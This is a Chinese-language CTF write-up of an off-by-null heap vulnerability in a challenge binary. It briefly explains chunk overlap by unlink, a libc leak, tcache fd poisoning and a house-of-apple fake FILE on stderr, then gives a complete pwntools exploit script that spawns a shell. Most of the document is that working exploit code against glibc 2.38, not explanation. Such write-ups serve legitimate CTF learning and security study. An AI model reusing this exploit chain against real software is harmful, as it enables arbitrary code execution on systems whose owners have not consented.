漏洞分析

用户自定义的输入函数会在输入的字符串的结尾加上一个\x00，造成了off by null漏洞
堆块可以申请的范围为0x410-0x500，0x410刚好可以进入tcache。思路为通过off-by-null来覆盖0x500的堆块的size位来向前overlap
然后通过切割来泄露出libc地址并控制tcache的fd指针，在stderr的位置写入fake_file来getshell
注意：这里是利用unlink的方法来招成overlap，因为他先强overlap时会对前一个空闲的堆块的fd指针和bk指针进行检测
通过off-by-null造成overlap并泄露出地址:

其中各个指针指向的位置都写在注释里了
泄露出libc后就可以控制tcache的fd指针实现任意地址写，直接house of apple一把梭

完整exp

from pwn import*
context(arch='amd64', os='linux',log_level="debug")
#libc = ELF("../libc/")
libc = ELF("/mnt/d/desktop/glibc-all-in-one/libs/2.38-3ubuntu1_amd64/libc.so.6")

def get_p(name):
    global p,elf 
    p = process(["/mnt/d/desktop/glibc-all-in-one/libs/2.38-3ubuntu1_amd64/ld-linux-x86-64.so.2", "./pwn"],
                env={"LD_PRELOAD":"/mnt/d/desktop/glibc-all-in-one/libs/2.38-3ubuntu1_amd64/libc.so.6"})
    # p = remote("172.10.0.7",10001)
    elf = ELF(name)

execve=[0x54ed3,0x11060a,0x110612,0x110617]

def add(size,content):
    p.sendlineafter(">> ",'1')
    p.sendlineafter("input your name size",str(size))
    p.sendafter("input your name",content)
def edit(idx,content):
    p.sendlineafter(">> ",'2')
    p.sendlineafter("input index",str(idx))
    p.sendlineafter("input your name size",str(len(content)))
    p.sendlineafter("input your name",content)

def show(idx):
    p.sendlineafter(">> ",'3')
    p.sendlineafter("input index",str(idx))

def dele(idx):
    p.sendlineafter(">> ",'4')
    p.sendlineafter("input index",str(idx))

get_p("./pwn")
p.recvuntil("0x")
heap_base = int(p.recv(12),16) - 0x2a0
log.success(f"heap_base: {heap_base:#x}")
print(hex(heap_base))
ptr = heap_base+0x2c0  # ptr指向第一个chunk的fd指针的位置(chunk 0)
log.success(f"ptr: {ptr:#x}")
add(0x408,p64(heap_base + 0x7b0)+b"a"*0x3ff+b'\n') # 0  前面的地址指向自己伪造的fake chunk的地址 即下面的edit(1)
log.success(f"heap_base + 0x7b0: {heap_base + 0x7b0:#x}")
add(0x4f8,"b"*0x4f8+'\n') # 1
add(0x408,"c"*0x407+'\n') # 2
add(0x4f8,"d"*0x4f7+'\n') # 3
add(0x408,"e"*0x407+'\n') # 4

edit(2,b"c"*0x400 + p64(0x410*2))
edit(1,b"b"*0xe0+p64(0)+p64(0x410*2+1)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0)+p64(0))  # 在chunk1中伪造一个fake chunk0x820

dele(3)
add(0x408,"d"*0x407+"\n")  # 3

add(0x408,"A"*0x407+"\n")  # 5
add(0x4f8,"A"+"\n")  # 6

for i in range(7):
    add(0x408,"A"*0x407+"\n")

for i in range(7):
    dele(7+i)

dele(5)
add(0x4f0,"A\n")    # 7
show(2)
libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(0x8,b"\x00")) - 0x1fef10
log.success(f"libc_base:{libc_base:#x}")

for i in range(4):
    execve[i]+=libc_base

print(hex(libc_base))
# gdb.attach(p)

stderr=libc_base+libc.symbols['_IO_2_1_stderr_']
system=libc_base+libc.symbols['system']

for i in range(7):
    add(0x408,"A"*0x407+"\n")

add(0x408,"A"*0x407+"\n") # 14
add(0x418,"A"*0x407+"\n") # 15
dele(15)
dele(10)
dele(14)
key=heap_base+0xbd0
edit(2,p64((key>>12)^stderr))
dele(1)
dele(15)
add(0x408,"A"*0x407+"\n")

fake_file = flat({
    0x0: b"  sh;",
    0x88: libc_base+0x2008f0,
    0x28: system,
    0xa0: stderr-0x40,   # _wide_data
    0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable //_IO_wfile_jumps
}, filler=b"\x00")

add(0x408,fake_file+b'\n')
sleep(0.1)
# gdb.attach(p)
# sleep(5)
p.sendline(b'5')
# gdb.attach(p)

p.interactive()
